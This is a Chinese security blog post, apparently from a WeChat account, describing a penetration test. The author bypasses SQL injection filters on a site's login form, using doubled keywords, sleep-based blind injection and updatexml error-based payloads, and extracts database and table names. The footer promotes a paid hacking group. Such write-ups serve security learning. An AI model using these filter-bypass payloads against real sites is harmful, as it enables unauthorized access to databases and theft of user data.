#  甲方让我复现SQL注入绕过复现....我懵了.......   
 渗透安全团队   2024-03-01 22:42  
  
前言  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMvjFvQibIQhm4UCibUj6d4sNYLWJn8zkkGL6t1ibiao9P2icjXee1ddSbB3Q/640?wx_fmt=jpeg&from=appmsg "")  
  
  
开始复现  
  
发现一处站点存在废弃的登录框，于是抓包想找一下登录接口有没有什么洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMYfjhO8iaIJYAVgv73x8icxongZicRgjS3Z1EMljp1Uda9JV9nAyuGlwJg/640?wx_fmt=png&from=appmsg "")  
  
登录处抓包发现单引号会报错，出现了sql语句  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMkFeZiaDJyF9EZgpcJ1OgaeO9J1hDoM1DNNYcAYNtE5uBHj13p7QkMew/640?wx_fmt=png&from=appmsg "")  
  
尝试基本的联合注入1’union select 1,2,3#  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMGJmUswdRp5iaTTsQNuehDh0MficEicIzKRcnhNI8hOYibxrtSydTNiaP80A/640?wx_fmt=png&from=appmsg "")  
  
发现select被过滤了，尝试双写绕过一下1’union selselectect 1,2,3#，成功绕过，但列数不一样。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZM3AeVEAsPJicmC77WfoGAe4m7LKdKnOowdDhBoNQxQAsInH2CMSZ4vsQ/640?wx_fmt=png&from=appmsg "")  
  
当尝试到14列的时候发现页面正常，共有14列  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMucWYaXBwXma5VtfmKb8ItPKuY8iahkS9K0kiaJtedfXo9usoMKNPx57Q/640?wx_fmt=png&from=appmsg "")  
  
但此时14列中均无回显点只能尝试盲注  
  
尝试最基本的1‘and
sleep(10)#  
  
很明显and被过滤了尝试下双写也不行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMsUbYOQCwSf8lpAb4zbne2iasHn6xEBbribC93UZicB7ae520zo7pdIgLQ/640?wx_fmt=png&from=appmsg "")  
  
尝试-1‘or sleep(10)#成功延迟了10秒回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMH6SohEiclRBbJiabMibvSYCIAdia9ZotxGObRk4eXAvlARST6AsbiaDDAYw/640?wx_fmt=png&from=appmsg "")  
  
尝试-1' or if((length(database())>10,sleep(5),1)#  
  
发现>被过滤了，看样子是HTML编码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMYibgiaVYauXRKBgx5ZaDiacjibrqUSBofKlicvlv79Z3T7GbVPxDPlXcSSw/640?wx_fmt=png&from=appmsg "")  
  
后又测试发现=也被过滤了，尝试使用in关键字-1 or substr(username,1,1) in ('t');  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMyRL0O17enOasnV2VUpJkfcpQluBuNRvrBwK2iby7I2xXiaLARd4ylU8g/640?wx_fmt=png&from=appmsg "")  
  
没想到in也被过滤了，双写也不行的那种。这里考虑了很久唯一离得开=<>和and的盲注语句只有1
or strcmp(ascii(substr(username,1,1)),117)#，可他在这个环境下不引起任何报错也不会有回显。  
  
继续尝试报错注入:  
  
由于select被过滤所以这里双写select  
  
'or(selselectect
updatexml(1,concat(0x7e,(seselectlect database())),0x7e))  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMib7u7gQH43kfNAuMvRggkrPf3aVnzt17nID89xzBiaLbEOA7R2wZEWicw/640?wx_fmt=png&from=appmsg "")  
  
成功通过报错注入得到数据库名  
  
想着继续查数据表(双写select，=用like替换)  
  
'or(seselectlect updatexml(1,concat(0x7e,(selselectect
group_concat(table_name)from information_schema.tables where table_schemalikedatabase())),0x7e))%23  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZMIJL2VIjs3EOWpOWVGFE9DibGfyo2zSmKoWgGcj6B6OLgJicMziavicLfrQ/640?wx_fmt=png&from=appmsg "")  
  
但此时where被过滤了，尝试双写无果。  
  
思索了片刻后发现这里不小心复制的是and的语句，但这里的and完整显示出来了，可能的情况就是他过滤的不是and而是%20and%20这种格式，那么我可以猜测where也是连同两边的%20(空格)一起过滤掉的，于是把语句修改为如下,用()替换%20：  
  
'and(selselectect%20updatexml(1,concat(0x7e,(selselectect%20group_concat(table_name)from(information_schema.tables)where(table_schema)like%20database())),0x7e))%23  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vpgeRD4WSQOL2KWQrhHiaQZM7X87WPSNwa6Ku1BLNiaQWx8iaiboVtItlhdcibB7XsicBzpR5lQ3xf6qWkw/640?wx_fmt=png&from=appmsg "")  
  
成功绕过得到所有表名  
  
其实细想来前面的所有过滤都可能只是为了防止sql注入又尽量不干涉用户的注册名做的针对%20xxx%20的格式进行的过滤，使用()代替空格也能绕过前面其他手法的注入。  
  
那么后面的爆列名爆字段方法大同小异，本次仅为学习测试，不再进行后续操作。  
  
总结  
  
在遇到SQL注入或XSS注入需要绕过时，若非为了效率的话，可以多尝试不同的思路，每一次实践都是学习的过程。  
  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CR7oAqnjIIbLZqCxwQtBk833sLbiagicscEic0LSVfOnbianSv11PxzJdcicQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CRBgpPoexbIY7eBAnR7sWS1BlBAQX51QhcOOOz06Ct2x1cMD25nA6mJQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
**关 注 有 礼**  
  
  
  
关注下方公众号回复“  
666  
”可以领取一套领取黑客成长秘籍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
